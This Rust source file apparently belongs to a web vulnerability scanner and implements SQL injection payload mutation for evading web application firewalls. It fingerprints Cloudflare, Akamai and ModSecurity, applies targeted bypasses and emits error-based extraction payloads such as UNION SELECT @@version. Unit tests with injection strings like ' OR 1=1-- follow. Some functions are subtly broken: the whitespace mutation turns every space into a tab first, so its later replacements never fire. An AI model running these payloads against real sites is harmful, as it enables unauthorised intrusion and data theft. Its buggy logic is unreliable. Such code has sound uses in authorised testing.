//! Active Probe Engine — smart payload mutation with context awareness.
//!
//! Goes beyond static wordlists by mutating payloads based on:
//! - Response context (HTML tags, error messages, framework hints)
//! - WAF/filter detection (response signature analysis)
//! - Reflection point identification (where input appears in response)

use crate::types::{Finding, Severity};

/// Mutation strategy
#[derive(Debug, Clone, PartialEq)]
pub enum MutationStrategy {
    /// Case variation: SELECT → SeLeCt → sElEcT
    CaseVariation,
    /// Comment insertion: SELECT/**/→ SELECT/*comment*/FROM
    CommentInsertion,
    /// Encoding: double URL encode, hex encode, unicode
    Encoding,
    /// Concatenation: 'OR'1'='1' → 'OR''1'='1
    Concatenation,
    /// Whitespace manipulation: tabs, newlines, comments as spaces
    Whitespace,
    /// Operator substitution: AND → &&, OR → ||
    OperatorSubstitution,
}

impl MutationStrategy {
    pub fn all() -> Vec<MutationStrategy> {
        vec![
            MutationStrategy::CaseVariation,
            MutationStrategy::CommentInsertion,
            MutationStrategy::Encoding,
            MutationStrategy::Concatenation,
            MutationStrategy::Whitespace,
            MutationStrategy::OperatorSubstitution,
        ]
    }
}

/// Apply mutation to base payload
pub fn mutate(payload: &str, strategy: &MutationStrategy) -> String {
    match strategy {
        MutationStrategy::CaseVariation => mutate_case(payload),
        MutationStrategy::CommentInsertion => mutate_comment(payload),
        MutationStrategy::Encoding => mutate_encoding(payload),
        MutationStrategy::Concatenation => mutate_concat(payload),
        MutationStrategy::Whitespace => mutate_whitespace(payload),
        MutationStrategy::OperatorSubstitution => mutate_operator(payload),
    }
}

/// Case variation — alternate case in keywords
fn mutate_case(payload: &str) -> String {
    let mut result = String::new();
    let mut upper = true;
    for c in payload.chars() {
        if c.is_alphabetic() && (upper || c.is_ascii_uppercase()) {
            if upper {
                result.push(c.to_ascii_uppercase());
            } else {
                result.push(c.to_ascii_lowercase());
            }
            upper = !upper;
        } else {
            result.push(c);
            upper = true; // reset on non-alpha
        }
    }
    result
}

/// Comment insertion — SQL style /* */
fn mutate_comment(payload: &str) -> String {
    payload
        .replace(" ", "/**/")
        .replace("SELECT ", "SELECT/**/")
        .replace("UNION ", "UNION/**/")
        .replace("FROM ", "FROM/**/")
        .replace("OR ", "/**/OR/**/")
        .replace("AND ", "/**/AND/**/")
}

fn mutate_encoding(payload: &str) -> String {
    payload
        .replace("'", "%27")
        .replace(" ", "%20")
        .replace("<", "%3C")
        .replace(">", "%3E")
        .replace("=", "%3D")
}

fn mutate_concat(payload: &str) -> String {
    payload
        .replace("'1'", "''+'1'+''")
        .replace("1=1", "1=1''+''")
}

fn mutate_whitespace(payload: &str) -> String {
    payload
        .replace(" ", "\t")
        .replace(" ", "\n")
        .replace(" ", "/**/")
        .replace(" OR ", "%0aOR%0a")
}

fn mutate_operator(payload: &str) -> String {
    payload
        .replace(" AND ", " && ")
        .replace(" OR ", " || ")
        .replace(" = ", " LIKE ")
        .replace("=", " IS ")
}

/// Response analyzer — extract clues about WAF/framework
#[derive(Debug, Clone)]
pub struct ResponseContext {
    pub framework_hint: Option<String>,
    pub waf_signature: Option<String>,
    pub error_pattern: Option<String>,
    pub reflection_points: Vec<usize>,
}

impl ResponseContext {
    pub fn analyze(body: &str) -> Self {
        Self {
            framework_hint: detect_framework(body),
            waf_signature: detect_waf(body),
            error_pattern: detect_error(body),
            reflection_points: find_reflection_points(body),
        }
    }
}

fn detect_framework(body: &str) -> Option<String> {
    if body.contains("__cf_bm") || body.contains("cf-ray") {
        Some("cloudflare".to_string())
    } else if body.contains("akamai") || body.contains("akamaihd.net") {
        Some("akamai".to_string())
    } else if body.contains("X-Powered-By: ASP.NET") || body.contains("__VIEWSTATE") {
        Some("aspnet".to_string())
    } else if body.contains("wp-content") || body.contains("wp-includes") {
        Some("wordpress".to_string())
    } else if body.contains("laravel_session") {
        Some("laravel".to_string())
    } else if body.contains("JSESSIONID") {
        Some("java".to_string())
    } else if body.contains("phpsessid") {
        Some("php".to_string())
    } else {
        None
    }
}

fn detect_waf(body: &str) -> Option<String> {
    let body_lower = body.to_lowercase();
    if body_lower.contains("cloudflare") && body_lower.contains("attention required") {
        Some("cloudflare".to_string())
    } else if body_lower.contains("akamai") && body_lower.contains("reference #") {
        Some("akamai".to_string())
    } else if body_lower.contains("blocked by") {
        Some("generic".to_string())
    } else if body_lower.contains("mod_security") || body_lower.contains("modsecurity") {
        Some("mod_security".to_string())
    } else {
        None
    }
}

fn detect_error(body: &str) -> Option<String> {
    if body.contains("ORA-") {
        Some("oracle".to_string())
    } else if body.contains("PostgreSQL") || body.contains("pg_query") {
        Some("postgresql".to_string())
    } else if body.contains("MySQL") || body.contains("mysqli") {
        Some("mysql".to_string())
    } else if body.contains("SQLite") {
        Some("sqlite".to_string())
    } else if body.contains("Microsoft SQL Server") || body.contains("Msg ") {
        Some("mssql".to_string())
    } else {
        None
    }
}

/// Find reflection points in body (where input might be echoed)
fn find_reflection_points(body: &str) -> Vec<usize> {
    // Look for common reflection markers
    let markers = ["UNIQUE_REFLECTION_MARKER_12345", "AAAAA", "test123"];
    let mut points = Vec::new();
    for marker in &markers {
        if let Some(pos) = body.find(marker) {
            points.push(pos);
        }
    }
    points
}

/// Generate smart mutation chain based on context
pub fn smart_mutate_chain(payload: &str, ctx: &ResponseContext) -> Vec<String> {
    let mut mutations = Vec::new();
    mutations.push(payload.to_string());

    // Always try base strategies
    for strategy in MutationStrategy::all() {
        mutations.push(mutate(payload, &strategy));
    }

    // WAF-specific bypasses
    if let Some(waf) = &ctx.waf_signature {
        match waf.as_str() {
            "cloudflare" => mutations.push(payload.replace("'", "\u{2019}")),  // unicode quote
            "akamai" => mutations.push(payload.replace(" ", "/**/")),
            "mod_security" => mutations.push(format!("{}--", payload)),
            _ => {}
        }
    }

    // Framework-specific
    if let Some(framework) = &ctx.framework_hint {
        match framework.as_str() {
            "php" => mutations.push(payload.replace("'", "\\'")),  // PHP escaping
            "java" => mutations.push(payload.replace("'", "\\'")),  // Java escaping
            _ => {}
        }
    }

    // Error-based hints (if SQL error detected, use error extraction payloads)
    if ctx.error_pattern.is_some() {
        mutations.push(format!("{} AND 1=CONVERT(int, (SELECT @@version))", payload));
        mutations.push(format!("{} UNION SELECT @@version,NULL,NULL", payload));
    }

    mutations
}

/// Convert mutation result to Finding
pub fn mutation_finding(payload: &str, ctx: &ResponseContext, evidence: &str) -> Finding {
    let severity = if ctx.error_pattern.is_some() {
        Severity::High
    } else if ctx.waf_signature.is_some() {
        Severity::Medium
    } else {
        Severity::Low
    };

    Finding::new(severity, "MUTATION", "Smart mutation payload bypassed filter", "https://target.com")
        .with_payload(payload)
        .with_evidence(evidence)
        .with_confidence(if ctx.error_pattern.is_some() { 85 } else { 60 })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mutate_case_basic() {
        let result = mutate("SELECT * FROM users", &MutationStrategy::CaseVariation);
        assert!(result.len() > 0);
        assert_ne!(result, "SELECT * FROM users"); // Should be different
        assert!(result.to_uppercase().contains("SELECT")); // Original chars preserved
    }

    #[test]
    fn mutate_comment_sql() {
        let result = mutate_comment("SELECT * FROM users WHERE id = 1");
        assert!(result.contains("/**/"));
        assert!(result.contains("SELECT"));
    }

    #[test]
    fn mutate_encoding_basic() {
        let result = mutate_encoding("' OR 1=1--");
        assert!(result.contains("%27"));
        assert!(result.contains("%20"));
    }

    #[test]
    fn mutate_concat_basic() {
        let result = mutate_concat("'1'='1'");
        assert!(result.contains("'1'+''"));
    }

    #[test]
    fn mutate_whitespace_basic() {
        let result = mutate_whitespace("SELECT * FROM users WHERE 1=1");
        assert!(result.contains("\t") || result.contains("/**/") || result.contains("\n"));
    }

    #[test]
    fn mutate_operator_basic() {
        let result = mutate_operator("1 AND 1=1");
        assert!(result.contains("&&") || result.contains("LIKE"));
    }

    #[test]
    fn all_strategies_returns_6() {
        assert_eq!(MutationStrategy::all().len(), 6);
    }

    #[test]
    fn detect_cloudflare_framework() {
        let body = "<html>cf-ray: 12345abc<br>Powered by Cloudflare</html>";
        let ctx = ResponseContext::analyze(body);
        assert_eq!(ctx.framework_hint, Some("cloudflare".to_string()));
    }

    #[test]
    fn detect_php_framework() {
        let body = "PHPSESSID=abc123; laravel_session=xyz";
        let ctx = ResponseContext::analyze(body);
        assert_eq!(ctx.framework_hint, Some("laravel".to_string()));
    }

    #[test]
    fn detect_mysql_error() {
        let body = "MySQL error: You have an error in your SQL syntax";
        let ctx = ResponseContext::analyze(body);
        assert_eq!(ctx.error_pattern, Some("mysql".to_string()));
    }

    #[test]
    fn detect_cloudflare_waf() {
        let body = "Attention Required! | Cloudflare";
        let ctx = ResponseContext::analyze(body);
        assert_eq!(ctx.waf_signature, Some("cloudflare".to_string()));
    }

    #[test]
    fn detect_no_framework() {
        let body = "<html>Hello World</html>";
        let ctx = ResponseContext::analyze(body);
        assert_eq!(ctx.framework_hint, None);
        assert_eq!(ctx.waf_signature, None);
    }

    #[test]
    fn smart_mutate_chain_includes_base() {
        let ctx = ResponseContext::analyze("<html>Cloudflare</html>");
        let chain = smart_mutate_chain("' OR 1=1--", &ctx);
        assert!(!chain.is_empty());
        assert!(chain.contains(&"' OR 1=1--".to_string()));  // Original
        assert!(chain.len() > 5);  // At least base + 6 strategies
    }

    #[test]
    fn smart_mutate_chain_with_error_pattern() {
        let ctx = ResponseContext::analyze("MySQL error in query");
        let chain = smart_mutate_chain("' OR 1=1--", &ctx);
        // Should include SQL error extraction payloads
        assert!(chain.iter().any(|p| p.contains("@@version") || p.contains("UNION SELECT")));
    }

    #[test]
    fn mutation_finding_severity() {
        let ctx = ResponseContext::analyze("MySQL error");
        let finding = mutation_finding("' OR 1=1", &ctx, "test");
        assert!(matches!(finding.severity, Severity::High));
        assert_eq!(finding.confidence, 85);
    }
}